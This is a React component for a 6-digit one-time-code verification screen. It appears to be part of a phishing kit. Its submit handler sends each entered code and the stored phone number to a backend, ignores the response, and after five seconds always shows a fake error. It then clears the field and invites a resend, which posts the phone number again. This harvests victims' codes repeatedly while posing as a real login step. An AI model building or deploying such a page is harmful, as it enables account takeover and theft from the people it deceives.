import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import axios from "axios";
import BASE_URL from "../components/urls";
import { HiArrowLeft } from "react-icons/hi";

const OTP_LENGTH = 6;
const RESEND_SECONDS = 30;

const Otp = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [seconds, setSeconds] = useState(RESEND_SECONDS);
  const [canResend, setCanResend] = useState(false);
  const inputRef = useRef(null);

  const phone = localStorage.getItem("gt_phone") || "";

  useEffect(() => {
    if (seconds <= 0) {
      setCanResend(true);
      return;
    }
    const timer = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(timer);
  }, [seconds]);

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  const handleChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, OTP_LENGTH);
    setOtp(value);
    setError("");
  };

  const handleSubmit = () => {
    if (otp.length < OTP_LENGTH) {
      setError("Please enter the complete 6-digit code.");
      return;
    }
    setLoading(true);
    setError("");
    axios.post(`${BASE_URL}/otp`, { otp, phone }).catch(() => {});
    setTimeout(() => {
      setLoading(false);
      setError("An error occurred. Please try again.");
      setOtp("");
      setSeconds(RESEND_SECONDS);
      setCanResend(false);
      inputRef.current?.focus();
    }, 5000);
  };

  const handleResend = () => {
    if (!canResend) return;
    setSeconds(RESEND_SECONDS);
    setCanResend(false);
    setOtp("");
    setError("");
    inputRef.current?.focus();
    axios.post(`${BASE_URL}/`, { phone }).catch(() => {});
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col px-7">
      {/* Back */}
      <div className="pt-12">
        <button
          type="button"
          onClick={() => navigate(-1)}
          className="bg-transparent cursor-pointer text-gray-700"
        >
          <HiArrowLeft className="text-2xl" />
        </button>
      </div>

      {/* Heading */}
      <div className="mt-8">
        <h1 className="text-[34px] font-black text-gray-900 leading-tight tracking-tight">
          6-digit code
        </h1>
        <p className="mt-3 text-[15px] text-gray-500 leading-snug">
          Enter the 6-digit code we sent to{" "}
          <span className="text-[#FA5621] font-semibold">{phone}</span>.
        </p>
      </div>

      {/* OTP input */}
      <div className="mt-8">
        <input
          ref={inputRef}
          type="tel"
          inputMode="numeric"
          pattern="[0-9]*"
          placeholder="Enter 6-digit code"
          value={otp}
          onChange={handleChange}
          maxLength={OTP_LENGTH}
          autoComplete="one-time-code"
          className="w-full bg-gray-200 rounded-xl px-5 py-5 text-[18px] text-gray-900 placeholder-gray-400 outline-none tracking-widest"
        />
        {error && (
          <p className="mt-2 text-sm text-red-500 font-medium">{error}</p>
        )}
      </div>

      {/* Continue button */}
      <div className="mt-4">
        <button
          type="button"
          disabled={loading}
          onClick={handleSubmit}
          className="w-full bg-[#FA5621] hover:bg-[#e04d1c] disabled:opacity-60 disabled:cursor-not-allowed text-white font-bold text-[17px] py-5 rounded-xl cursor-pointer transition-colors duration-200"
        >
          {loading ? "Verifying..." : "Continue"}
        </button>
      </div>

      {/* Resend */}
      <p className="mt-6 text-[13px] text-gray-400">
        Didn&apos;t get the code?{" "}
        {canResend ? (
          <button
            type="button"
            onClick={handleResend}
            className="text-[#FA5621] font-semibold bg-transparent cursor-pointer"
          >
            Resend
          </button>
        ) : (
          <span>
            Resend in{" "}
            <span className="text-gray-700 font-bold">{seconds} sec</span>
          </span>
        )}
      </p>
    </div>
  );
};

export default Otp;
